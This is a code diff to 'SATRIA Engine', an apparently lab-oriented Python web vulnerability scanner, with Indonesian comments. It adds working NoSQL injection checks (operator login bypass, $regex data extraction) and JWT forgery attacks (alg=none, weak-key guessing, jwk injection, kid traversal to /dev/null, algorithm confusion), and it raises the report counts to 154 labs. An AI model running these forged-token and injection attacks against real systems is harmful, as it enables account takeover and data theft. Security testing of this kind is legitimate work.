+                                success = (st in (200,302,301) and (('logout' in txt.lower() or 'my account' in txt.lower() or 'welcome' in txt.lower()) and not ('logout' in bft.lower() or 'my account' in bft.lower())))
+                                if success or (setcookie and st in (302,301,200) and txt!=bft and bfs in (200,401,403) and ('invalid' not in txt.lower() and 'incorrect' not in txt.lower())):
+                                    self._nosql_mark(144, lu, f"NoSQL operator injection auth bypass terverifikasi (JSON) pada {lu} (field {ufield}/{pfield}): autentikasi/sesi berbeda dari login gagal.", "nosql_operator_bypass_auth")
+                                    break
+
+        # 145: Exploiting NoSQL injection to extract data (bukti diferensial kuat)
+        if 145 not in self._confirmed and self._within_budget():
+            # cari endpoint yang memberi diferensial boolean via $regex/$ne pada parameter pencarian/user
+            for url, method, name, is_json in cand[:30]:
+                if 145 in self._confirmed or not self._within_budget(): break
+                try:
+                    rt = self._request(method, url, params={name+"[$regex]":"^.*"} if method=='GET' else None, data={name+"[$regex]":"^.*"} if method!='GET' else None, allow_redirects=True)
+                    rf = self._request(method, url, params={name+"[$regex]":"^zzzzzz_no_match_"} if method=='GET' else None, data={name+"[$regex]":"^zzzzzz_no_match_"} if method!='GET' else None, allow_redirects=True)
+                except Exception: rt = rf = None
+                if not (rt and rf): continue
+                tt=getattr(rt,'text','') or ''; ft=getattr(rf,'text','') or ''
+                stt=getattr(rt,'status',0); stf=getattr(rf,'status',0)
+                # bukti ekstraksi/diferensial kuat: dua regex berlawanan memberi hasil berbeda konsisten (status atau konten bermakna) bukan error generik sama
+                if tt!=ft and (stt!=stf or abs(len(tt)-len(ft))>40) and stt in (200,302) and (stf in (200,302,404,401,403) or len(ft)<len(tt)):
+                    # verifikasi ulang konsistensi sekali
+                    try:
+                        rt2 = self._request(method, url, params={name+"[$regex]":"^.*"} if method=='GET' else None, data={name+"[$regex]":"^.*"} if method!='GET' else None, allow_redirects=True)
+                        rf2 = self._request(method, url, params={name+"[$regex]":"^zzzzzz_no_match_"} if method=='GET' else None, data={name+"[$regex]":"^zzzzzz_no_match_"} if method!='GET' else None, allow_redirects=True)
+                    except Exception: rt2=rf2=None
+                    if rt2 and rf2 and getattr(rt2,'text','')!=getattr(rf2,'text',''):
+                        self._nosql_mark(145, url, f"Ekstraksi data via NoSQL injection terverifikasi (diferensial $regex konsisten) pada {url} param {name}: respons true/false berbeda stabil (status {stt}/{stf}).", "nosql_extract_data")
+                        break
+
+        # 146: Exploiting NoSQL operator injection to extract unknown fields
+        if 146 not in self._confirmed and self._within_budget():
+            for url, method, name, is_json in cand[:30]:
+                if 146 in self._confirmed or not self._within_budget(): break
+                # injeksi $where / enumerasi field via operator pada JSON login-like: coba tebak field umum vs tidak ada
+                guesses = ['username','email','password','token','resetToken','role','isAdmin']
+                for lu in [u for u,_,_,_ in cand if 'login' in u.lower() or 'user' in u.lower()][:4] or [target]:
+                    if 146 in self._confirmed or not self._within_budget(): break
+                    try:
+                        b = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":"x"}), headers={'Content-Type':'application/json'}, allow_redirects=True)
+                    except Exception: b=None
+                    bt=getattr(b,'text','') or '' if b else ''
+                    # operator $ne pada field yang mungkin ada vs field acak -> diferensial menunjukkan field ada
+                    try:
+                        r_exist = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":{"$ne":"x"}}), headers={'Content-Type':'application/json'}, allow_redirects=True)
+                        r_fake = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":{"$ne":"x"},"__no_such_field__x":{"$ne":""}}), headers={'Content-Type':'application/json'}, allow_redirects=True)
+                    except Exception: r_exist=r_fake=None
+                    if r_exist and r_fake:
+                        te=getattr(r_exist,'text','') or ''; tf=getattr(r_fake,'text','') or ''
+                        se=getattr(r_exist,'status',0); sf=getattr(r_fake,'status',0)
+                        # sinyal field discovery: respons berubah saat menyertakan kondisi pada field nyata/struktur berbeda stabil
+                        if te!=tf and (se!=sf or abs(len(te)-len(tf))>30) and te!=bt:
+                            try:
+                                r_exist2 = self._request('POST', lu, data=_json.dumps({"username":"carlos","password":{"$ne":"x"}}), headers={'Content-Type':'application/json'}, allow_redirects=True)
+                            except Exception: r_exist2=None
+                            if r_exist2 and getattr(r_exist2,'text','')!=tf:
+                                self._nosql_mark(146, lu, f"Ekstraksi/enumerasi field (unknown fields) via NoSQL operator terverifikasi pada {lu}: perilaku operator berbeda konsisten saat field/struktur diinjeksi (status {se}/{sf}).", "nosql_extract_unknown_fields")
+                                break
+
+
+
+    # ======================== JWT (147-154, konservatif, bukti terverifikasi) ========================
+
+    def _jwt_mark(self, num: int, url: str, ev: str, method_name: str):
+        point = Point(key=f"jwt-{num}", kind="endpoint", label=f"JWT {url}",
+                      url=url, name="jwt", original="", page_url=url, method="GET", interest=8)
+        self._mark(num, point, ev, method_name)
+
+    def phase_jwt(self, pages: list[Page], points: list[Point]) -> None:
+        if not self._within_budget():
+            return
+        import base64, json as _json, hmac, hashlib
+        target = self.target_url
+        pu = urlparse(target)
+        origin = f"{pu.scheme}://{pu.netloc}"
+
+        def b64url_decode(s):
+            s = str(s or '')
+            s += '=' * (-len(s) % 4)
+            return base64.urlsafe_b64decode(s.encode())
+
+        def b64url_encode(b):
+            return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+
+        def decode_jwt(tok):
+            try:
+                parts = tok.split('.')
+                if len(parts) != 3: return None
+                hdr = _json.loads(b64url_decode(parts[0]))
+                payload = _json.loads(b64url_decode(parts[1]))
+                return {'header': hdr, 'payload': payload, 'parts': parts, 'raw': tok}
+            except Exception:
+                return None
+
+        def encode_jwt(hdr, payload, secret=None, alg=None, key_pem=None):
+            alg = (alg or hdr.get('alg') or 'HS256').upper()
+            h_b = b64url_encode(_json.dumps(hdr, separators=(',',':')).encode()).encode()
+            p_b = b64url_encode(_json.dumps(payload, separators=(',',':')).encode()).encode()
+            signing_input = h_b + b'.' + p_b
+            if alg == 'NONE':
+                sig = b''
+            elif alg.startswith('HS'):
+                dig = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}.get(alg, hashlib.sha256)
+                sig = base64.urlsafe_b64encode(hmac.new((secret or b''), signing_input, dig).digest()).rstrip(b'=')
+            else:
+                # RS/ES via cryptography/pyjwt
+                try:
+                    import jwt as pyjwt
+                    tok = pyjwt.encode(payload, key_pem or secret, algorithm=alg, headers=hdr)
+                    return tok if isinstance(tok,str) else tok.decode()
+                except Exception:
+                    return None
+            return (signing_input + b'.' + sig).decode()
+
+        # temukan JWT & endpoint proteksi
+        tokens = []  # (token, location, cookie_name_or_header)
+        def add_tok(tok, loc, name):
+            if not tok or tok in [t[0] for t in tokens]: return
+            if tok.count('.') == 2 and len(tok) > 20:
+                tokens.append((tok, loc, name))
+
+        # dari header Set-Cookie respons awal / session cookie
+        try:
+            r0 = self._request('GET', target, allow_redirects=True)
+        except Exception: r0 = None
+        if r0:
+            h = getattr(r0,'headers',{}) or {}
+            sc = str(h.get('Set-Cookie','') or h.get('set-cookie','') or '')
+            for m in re.finditer(r'(session|token|jwt|auth|id_token)=([^;\s]+)', sc, re.I):
+                add_tok(m.group(2), 'cookie', m.group(1))
+        # dari cookies client session bila ada
+        try:
+            for c in getattr(self,'session',None).cookies or []:
+                if any(k in (c.name or '').lower() for k in ('token','jwt','session','auth')):
+                    add_tok(c.value, 'cookie', c.name)
+        except Exception: pass
+        # dari halaman (JS/localStorage hints)
+        for pg in pages[:10]:
+            txt = getattr(pg,'text','') or ''
+            for m in re.finditer(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*', txt):
+                add_tok(m.group(0), 'page', 'inline')
+
+        if not tokens:
+            return
+
+        # endpoint proteksi kandidat
+        protected = []
+        for pg in pages[:20]:
+            u = getattr(pg,'url','') or ''
+            ul = u.lower()
+            if any(k in ul for k in ('admin','account','my-account','profile','dashboard','user','settings')):
+                if u not in protected: protected.append(u)
+        protected += [urljoin(origin+'/', p) for p in ('/admin','/my-account','/account','/profile','/dashboard')]
+        # dedupe
+        prot2=[]; seen=set()
+        for u in protected:
+            if u and u not in seen: seen.add(u); prot2.append(u)
+        protected = prot2[:10]
+
+        def try_access_with_token(tok, cookie_name=None, as_auth=False):
+            # coba cookie dan Authorization Bearer
+            resps = []
+            try:
+                headers = {}
+                cookies = {}
+                if cookie_name: cookies[cookie_name]=tok
+                else: cookies['session']=tok
+                for u in protected[:6]:
+                    try: resps.append((u, self._request('GET', u, headers=headers, cookies=cookies, allow_redirects=True)))
+                    except Exception: pass
+                    try: resps.append((u, self._request('GET', u, headers={'Authorization':'Bearer '+tok}, allow_redirects=True)))
+                    except Exception: pass
+            except Exception: pass
+            return resps
+
+        # baseline akses (tanpa modif / token asli)
+        def is_privileged(resp, base_resp=None):
+            if not resp: return False
+            st = getattr(resp,'status',0) or 0
+            txt = (getattr(resp,'text','') or '').lower()
+            btxt = (getattr(base_resp,'text','') or '').lower() if base_resp else ''
+            if st == 200 and any(k in txt for k in ('admin','dashboard','my account','logout','sign out','your account','profile','wiener','carlos','administrator')):
+                if base_resp is None: return True
+                bst = getattr(base_resp,'status',0) or 0
+                if bst in (401,403,302,301) or (('login' in btxt or 'sign in' in btxt) and 'logout' not in btxt):
+                    return True
+                if 'admin' in txt and 'admin' not in btxt: return True
+            return False
+
+        # baseline unauthorized
+        unauth_map = {}
+        for u in protected[:6]:
+            try: unauth_map[u] = self._request('GET', u, allow_redirects=True)
+            except Exception: unauth_map[u]=None
+
+        for tok, loc, name in tokens[:4]:
+            dec = decode_jwt(tok)
+            if not dec or not self._within_budget(): continue
+            hdr = dict(dec['header'] or {}); payload = dict(dec['payload'] or {})
+            cookie_name = name if loc=='cookie' else 'session'
+            # baseline with original token
+            orig_resps = try_access_with_token(tok, cookie_name)
+            orig_ok = any(is_privileged(r, unauth_map.get(u)) for u,r in orig_resps)
+
+            def confirm_with_forged(forged, label, num, method_name):
+                for u, r in try_access_with_token(forged, cookie_name):
+                    base = unauth_map.get(u)
+                    if is_privileged(r, base):
+                        # pastikan berbeda dari unauthorized
+                        self._jwt_mark(num, u, f"JWT auth bypass ({label}) terverifikasi pada {u}: token hasil manipulasi diterima dan memberi akses terproteksi (status {getattr(r,'status',0)}).", method_name)
+                        return True
+                return False
+
+            # 147: unverified signature (ubah payload, biarkan/tamper signature)
+            if 147 not in self._confirmed and self._within_budget():
+                p2 = dict(payload); changed = False
+                for k in ('sub','username','user','email','role','admin','isAdmin'):
+                    if k in p2:
+                        if isinstance(p2[k], bool): p2[k]=True; changed=True
+                        elif isinstance(p2[k], str) and p2[k] not in ('administrator','admin'): p2[k]='administrator'; changed=True
+                        elif isinstance(p2[k], (int,float)) and p2[k]!=0: p2[k]=0; changed=True
+                        if changed: break
+                if not changed: p2['sub']='administrator'; changed=True
+                if changed:
+                    forged = encode_jwt(hdr, p2, secret=b'ignored', alg=hdr.get('alg','HS256'))
+                    if forged and forged!=tok:
+                        # juga coba signature asli dengan payload baru (beberapa impl hanya decode tanpa verify)
+                        parts = forged.split('.'); orig_parts = tok.split('.')
+                        forged_keep_sig = parts[0]+'.'+parts[1]+'.'+orig_parts[2]
+                        for cand_tok in (forged_keep_sig, forged):
+                            if 147 in self._confirmed: break
+                            confirm_with_forged(cand_tok, 'unverified signature', 147, 'jwt_unverified_signature')
+
+            # 148: flawed signature verification (alg none)
+            if 148 not in self._confirmed and self._within_budget():
+                p2 = dict(payload)
+                for k in ('sub','username','user','email'): 
+                    if k in p2 and isinstance(p2[k],str): p2[k]='administrator'; break
+                else:
+                    p2['sub']='administrator'
+                for none_alg in ('none','None','NONE','nOnE'):
+                    if 148 in self._confirmed: break
+                    h2 = dict(hdr); h2['alg']=none_alg
+                    # token alg none umumnya header.payload.
+                    t_none = encode_jwt(h2, p2, alg='NONE')
+                    if t_none:
+                        # pastikan format dengan trailing dot
+                        parts = t_none.split('.')
+                        if len(parts)==3:
+                            for cand_tok in (t_none, parts[0]+'.'+parts[1]+'.', parts[0]+'.'+parts[1]):
+                                if 148 in self._confirmed: break
+                                # normalisasi ke 2 titik
+                                ct = cand_tok
+                                if ct.count('.')==1: ct = ct + '.'
+                                confirm_with_forged(ct, f'alg={none_alg}', 148, 'jwt_flawed_signature')
+
+            # 149: weak signing key (HS*)
+            if 149 not in self._confirmed and self._within_budget():
+                alg = (hdr.get('alg') or 'HS256').upper()
+                if alg.startswith('HS'):
+                    weak = ['secret','secret1','password','123456','admin','key','jwt','changeme','qwerty','letmein','welcome','password1','secret123','Secret','SECRET','']
+                    for wk in weak:
+                        if 149 in self._confirmed or not self._within_budget(): break
+                        try:
+                            import jwt as pyjwt
+                            pyjwt.decode(tok, wk, algorithms=[alg])
+                            # key benar -> forge
+                            p2 = dict(payload)
+                            for k in ('sub','username','user','email'):
+                                if k in p2 and isinstance(p2[k],str): p2[k]='administrator'; break
+                            else: p2['sub']='administrator'
+                            forged = pyjwt.encode(p2, wk, algorithm=alg, headers=hdr)
+                            if isinstance(forged, bytes): forged = forged.decode()
+                            confirm_with_forged(forged, f'weak signing key ({wk!r})', 149, 'jwt_weak_signing_key')
+                        except Exception:
+                            continue
+
+            # 150: jwk header injection (embedded JWK)
+            if 150 not in self._confirmed and self._within_budget():
+                try:
+                    from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
+                    from cryptography.hazmat.primitives import serialization as _ser
+                    import jwt as pyjwt
+                    priv = _rsa.generate_private_key(public_exponent=65537, key_size=2048)
+                    pub = priv.public_key()
+                    nums = pub.public_numbers()
+                    def _b64u_int(i):
+                        b = i.to_bytes((i.bit_length()+7)//8, 'big')
+                        return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
+                    jwk = {"kty":"RSA","e":_b64u_int(nums.e),"n":_b64u_int(nums.n),"alg":hdr.get('alg','RS256')}
+                    h2 = dict(hdr); h2['jwk']=jwk; h2.pop('kid',None)
+                    p2 = dict(payload)
+                    for k in ('sub','username','user','email'):
+                        if k in p2 and isinstance(p2[k],str): p2[k]='administrator'; break
+                    else: p2['sub']='administrator'
+                    priv_pem = priv.private_bytes(_ser.Encoding.PEM,_ser.PrivateFormat.PKCS8,_ser.NoEncryption())
+                    alg_use = hdr.get('alg','RS256')
+                    try:
+                        forged = pyjwt.encode(p2, priv_pem, algorithm=alg_use if alg_use.startswith('RS') or alg_use.startswith('ES') else 'RS256', headers=h2)
+                        if isinstance(forged, bytes): forged = forged.decode()
+                        confirm_with_forged(forged, 'jwk header injection', 150, 'jwt_jwk_header_injection')
+                    except Exception: pass
+                except Exception: pass
+
+            # 151: jku header injection (butuh server key kita; konservatif - hanya konfirmasi bila ada sinyal fetch/acceptance tidak mungkin tanpa infra)
+            # tanpa infrastruktur hosting JWK terkontrol, tidak dikonfirmasi (anti-FP)
+
+            # 152: kid header path traversal (/dev/null -> empty key for HS256)
+            if 152 not in self._confirmed and self._within_budget():
+                try:
+                    import jwt as pyjwt
+                    p2 = dict(payload)
+                    for k in ('sub','username','user','email'):
+                        if k in p2 and isinstance(p2[k],str): p2[k]='administrator'; break
+                    else: p2['sub']='administrator'
+                    for kid in ("../../../../../../../dev/null","/dev/null","../../../../../../dev/null"):
+                        if 152 in self._confirmed: break
+                        h2 = dict(hdr); h2['kid']=kid; h2['alg']='HS256'
+                        # sign with empty key (contents of /dev/null)
+                        for key in (b'', '', b'\x00'):
+                            try:
+                                forged = pyjwt.encode(p2, key, algorithm='HS256', headers=h2)
+                                if isinstance(forged, bytes): forged = forged.decode()
+                                if confirm_with_forged(forged, f'kid path traversal ({kid})', 152, 'jwt_kid_path_traversal'):
+                                    break
+                            except Exception: pass
+                except Exception: pass
+
+            # 153: algorithm confusion (RS->HS dengan public key terekspos)
+            if 153 not in self._confirmed and self._within_budget():
+                alg = (hdr.get('alg') or '').upper()
+                if alg.startswith('RS') or alg.startswith('ES') or True:
+                    key_urls = [urljoin(origin+'/', p) for p in ('/.well-known/jwks.json','/jwks.json','/oauth2/jwks','/api/keys','/auth/jwks','/keys','/public.pem','/jwks')]
+                    pub_pem = None
+                    for ku in key_urls:
+                        if pub_pem or not self._within_budget(): break
+                        try:
+                            kr = self._request('GET', ku, allow_redirects=True)
+                        except Exception: continue
+                        ktxt = getattr(kr,'text','') or ''
+                        if getattr(kr,'status',0) != 200 or not ktxt: continue
+                        if 'BEGIN PUBLIC KEY' in ktxt or 'BEGIN RSA PUBLIC KEY' in ktxt:
+                            pub_pem = ktxt; break
+                        try:
+                            j = _json.loads(ktxt)
+                            keys = j.get('keys') or ([j] if 'kty' in j else [])
+                            for k in keys:
+                                if k.get('kty')=='RSA' and 'n' in k and 'e' in k:
+                                    try:
+                                        from cryptography.hazmat.primitives.asymmetric import rsa as _rsa
+                                        from cryptography.hazmat.primitives import serialization as _ser
+                                        def _b64u_to_int(s):
+                                            s += '='*(-len(s)%4); return int.from_bytes(base64.urlsafe_b64decode(s.encode()), 'big')
+                                        pubnums = _rsa.RSAPublicNumbers(_b64u_to_int(k['e']), _b64u_to_int(k['n']))
+                                        pubkey = pubnums.public_key()
+                                        pub_pem = pubkey.public_bytes(_ser.Encoding.PEM, _ser.PublicFormat.SubjectPublicKeyInfo).decode()
+                                        break
+                                    except Exception: pass
+                            if pub_pem: break
+                        except Exception: pass
+                    if pub_pem:
+                        try:
+                            import jwt as pyjwt
+                            p2 = dict(payload)
+                            for k in ('sub','username','user','email'):
+                                if k in p2 and isinstance(p2[k],str): p2[k]='administrator'; break
+                            else: p2['sub']='administrator'
+                            h2 = dict(hdr); h2['alg']='HS256'
+                            forged = pyjwt.encode(p2, pub_pem, algorithm='HS256', headers=h2)
+                            if isinstance(forged, bytes): forged = forged.decode()
+                            confirm_with_forged(forged, 'algorithm confusion (RS->HS, exposed key)', 153, 'jwt_algorithm_confusion')
+                        except Exception: pass
+
+            # 154: algorithm confusion with no exposed key - sangat sulit diverifikasi tanpa key/signature khusus; konservatif, tidak dikonfirmasi tanpa bukti derivasi kunci yang valid
+
+
     # ======================== HTTP Request Smuggling (91-112, konservatif, bukti diferensial) ========================
 
     def _smug_target(self) -> tuple[str, int, str, str]:
@@ -4406,9 +5277,9 @@ def write_report(report: dict[str, Any], output_dir: Path) -> tuple[Path, Path]:
         "<style>body{font-family:system-ui,Arial;margin:24px;color:#17202b}table{border-collapse:collapse;width:100%}"
         "th,td{border:1px solid #d8e2ea;padding:8px;vertical-align:top}th{background:#edf3f8}"
         ".confirmed{color:#0b7a3b;font-weight:700}.not_confirmed{color:#7a5a12}</style></head><body>"
-        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF, Smuggling, OS Cmdi & Web Cache Poisoning (130 Lab)</h1>"
+        "<h1>SATRIA Engine — SQLi, XSS, CSRF, Clickjacking, DOM, CORS, XXE, SSRF, Smuggling, OS Cmdi, WCP, Info Disclosure, Host Header, NoSQLi & JWT (154 Lab)</h1>"
         f"<p>Target: <code>{html_module.escape(report['target'])}</code> &middot; "
-        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/130</b></p>"
+        f"Terkonfirmasi: <b>{report['summary']['confirmed']}/154</b></p>"
         "<table><thead><tr><th>Lab</th><th>Status</th><th>Judul</th><th>Lokasi</th><th>Bukti</th></tr></thead>"
         f"<tbody>{rows}</tbody></table>"
         "<p><small>Status 'not_confirmed' berarti bukti tidak cukup; bukan klaim tidak rentan.</small></p>"
@@ -4770,7 +5641,7 @@ def _pdf_lab_items(result: dict[str, Any]) -> list[dict[str, Any]]:
     items: list[dict[str, Any]] = []
     for number, title, key, severity in CATALOG:
         lab_id = lab_id_for(number)
-        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {}) or by_id.get(f"smuggling-{number:02d}", {}) or by_id.get(f"os-command-injection-{number:02d}", {}) or by_id.get(f"web-cache-poisoning-{number:02d}", {})
+        found = by_id.get(lab_id, {}) or by_id.get(f"sql_injection-{number:02d}", {}) or by_id.get(f"xss-{number:02d}", {}) or by_id.get(f"csrf-{number:02d}", {}) or by_id.get(f"clickjacking-{number:02d}", {}) or by_id.get(f"dom-{number:02d}", {}) or by_id.get(f"cors-{number:02d}", {}) or by_id.get(f"xxe-{number:02d}", {}) or by_id.get(f"ssrf-{number:02d}", {}) or by_id.get(f"smuggling-{number:02d}", {}) or by_id.get(f"os-command-injection-{number:02d}", {}) or by_id.get(f"web-cache-poisoning-{number:02d}", {}) or by_id.get(f"information-disclosure-{number:02d}", {}) or by_id.get(f"http-host-header-{number:02d}", {}) or by_id.get(f"nosql-injection-{number:02d}", {}) or by_id.get(f"jwt-{number:02d}", {})
         items.append({
             "number": number, "id": lab_id, "status": str(found.get("status", "not_confirmed")),
             "title": str(found.get("title", title)), "method": str(found.get("method", "not tested / insufficient evidence")),
@@ -4827,6 +5698,19 @@ _PDF_LAB_FOCUS = {
     126: "Web cache poisoning (URL normalization)", 127: "Web cache poisoning (DOM, strict cacheability)",
     128: "Web cache poisoning (combining vulnerabilities)", 129: "Web cache poisoning (cache key injection)",
     130: "Web cache poisoning (internal cache poisoning)",
+    131: "Information disclosure (error messages)", 132: "Information disclosure (debug page)",
+    133: "Source code disclosure (backup files)", 134: "Authentication bypass (information disclosure)",
+    135: "Information disclosure (version control history)",
+    136: "HTTP Host header (basic password reset poisoning)", 137: "HTTP Host header (authentication bypass)",
+    138: "HTTP Host header (cache poisoning via ambiguous requests)", 139: "HTTP Host header (routing-based SSRF)",
+    140: "HTTP Host header (SSRF via flawed request parsing)", 141: "HTTP Host header (connection state bypass)",
+    142: "HTTP Host header (password reset poisoning via dangling markup)",
+    143: "NoSQL injection (detecting)", 144: "NoSQL injection (operator bypass authentication)",
+    145: "NoSQL injection (extract data)", 146: "NoSQL injection (extract unknown fields)",
+    147: "JWT (unverified signature)", 148: "JWT (flawed signature verification)",
+    149: "JWT (weak signing key)", 150: "JWT (jwk header injection)",
+    151: "JWT (jku header injection)", 152: "JWT (kid header path traversal)",
+    153: "JWT (algorithm confusion)", 154: "JWT (algorithm confusion, no exposed key)",
 }
 
 
@@ -4862,10 +5746,10 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     page.rect(0, _PDF_PAGE_H - 242, _PDF_PAGE_W, 12, _PDF_COLORS["teal"])
     page.text(content_left, _PDF_PAGE_H - 84, "SATRIA BARU", 30, _PDF_COLORS["white"], bold=True)
     page.text(content_left, _PDF_PAGE_H - 112, "LAPORAN PEMINDAIAN SQL INJECTION, XSS, CSRF & CLICKJACKING", 13.5, _PDF_COLORS["light"], bold=True)
-    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 130 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
+    page.text(content_left, _PDF_PAGE_H - 134, "Cakupan 154 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning + 5 Information disclosure + 7 HTTP Host header attacks + 4 NoSQLi + 8 JWT) - bukti diferensial dan konservatif", 10.2, _PDF_COLORS["light"])
     page.y = _PDF_PAGE_H - 286
     page.paragraph(content_left, content_width, "Hasil Pemindaian", 21, _PDF_COLORS["navy"], bold=True)
-    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 130 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
+    page.paragraph(content_left, content_width, "Laporan ini merangkum pengujian terhadap 154 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning, 5 Information disclosure, 7 HTTP Host header attacks, 4 NoSQL injection, 8 JWT) yang diminta. Status tidak terkonfirmasi berarti bukti tidak cukup; bukan klaim bahwa lab tidak rentan.", 9.8, _PDF_COLORS["muted"])
     page.y -= 18
     for label, value in (("Target", target), ("Hasilkan", generated or "-"), ("Mode", str(result.get("mode", "active")))):
         page.text(content_left, page.y - 10, f"{label}:", 9.0, _PDF_COLORS["navy"], bold=True)
@@ -4889,7 +5773,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
         page.text(x, kpi_top - 62, label.upper(), 7.5, _PDF_COLORS["muted"], bold=True)
     page.y = kpi_top - 110
     page.section_title("Hal yang penting dibaca")
-    page.bullet_paragraph("130 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning) yang diminta dimasukkan ke laporan ini.")
+    page.bullet_paragraph("154 judul lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning, 5 Information disclosure, 7 HTTP Host header attacks, 4 NoSQL injection, 8 JWT) yang diminta dimasukkan ke laporan ini.")
     page.bullet_paragraph("Status confirmed memakai bukti diferensial yang dapat diulang; not_confirmed bukan bukti tidak rentan.")
     page.bullet_paragraph("Lab 16-17 hanya dapat terkonfirmasi bila collaborator/poller mencatat interaksi OOB. Tanpa itu, lab terkait tetap not_confirmed.")
     page.bullet_paragraph("Bukti ditampilkan apa adanya berdasarkan temuan terverifikasi.")
@@ -4897,7 +5781,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # --------------------------------------------------------------- RINGKASAN
     page.new_page()
-    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 130 lab yang diminta.")
+    page.section_title("Ringkasan Hasil", "Angka berikut berasal dari 154 lab yang diminta.")
     rows = [
         ("Total lab", "90", "Semua judul wajib dari katalog (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF)."),
         ("Terkonfirmasi", str(len(confirmed)), "Bukti diferensial terpenuhi dan dapat diulang."),
@@ -4948,7 +5832,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
 
     # ------------------------------------------------------------------- TABEL
     page.new_page()
-    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 130 lab.")
+    page.section_title("Hasil Pemindaian", "Tabel ringkas: satu baris untuk setiap 154 lab.")
     headers = ("Lab", "Status", "Fokus", "Judul", "Severity")
     widths = (82.0, 92.0, 90.0, 190.0, 45.0)
     x_cols = []
@@ -5035,7 +5919,7 @@ def render_pdf(result: dict[str, Any], path: str | None = None) -> Path:
     # --------------------------------------------------------- CATATAN AKHIR
     page.y -= 6
     page.section_title("Catatan Laporan")
-    page.bullet_paragraph("Dokumen ini memuat 130 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
+    page.bullet_paragraph("Dokumen ini memuat 154 lab (18 SQL injection, 30 XSS, 11 CSRF, 5 Clickjacking, 7 DOM-based, 3 CORS, 9 XXE, 7 SSRF, 22 HTTP request smuggling, 5 OS command injection, 13 Web cache poisoning, 5 Information disclosure, 7 HTTP Host header attacks, 4 NoSQL injection, 8 JWT) yang diminta. Status not_confirmed berarti bukti tidak cukup, bukan klaim tidak rentan.")
     page.bullet_paragraph("Status not_confirmed tidak sama dengan tidak rentan; ia hanya menyatakan bukti pemindaian tidak cukup.")
     page.bullet_paragraph("Ringkasan severity dihitung dari temuan terkonfirmasi saja, sesuai field summary yang dibaca app.py.")
     page.bullet_paragraph("Lab 16-17 memerlukan collaborator atau webhook poller. Tanpa itu, pemindai tidak mengklaim deteksi OOB.")
@@ -5137,7 +6021,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
                  allow_partial_tools: bool | None = None,
                  enable_llm: bool | None = None, run_censys: bool | None = None,
                  run_nvd: bool | None = None, **runtime_options: Any) -> dict[str, Any]:
-    """Jalur kompatibel yang dipakai app.py; memindai 130 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning)."""
+    """Jalur kompatibel yang dipakai app.py; memindai 154 lab (18 SQLi + 30 XSS + 11 CSRF + 5 Clickjacking + 7 DOM-based + 3 CORS + 9 XXE + 7 SSRF + 22 HTTP request smuggling + 5 OS command injection + 13 Web cache poisoning + 5 Information disclosure + 7 HTTP Host header attacks + 4 NoSQLi + 8 JWT)."""
     overrides: dict[str, Any] = dict(runtime_options)
     for name, value in (("allow_partial_tools", allow_partial_tools),
                         ("enable_llm", enable_llm), ("run_censys", run_censys),
@@ -5186,7 +6070,7 @@ def run_pipeline(scrape_data: dict[str, Any] | None = None, *, url: str | None =
 
 
 def main(argv: list[str] | None = None) -> int:
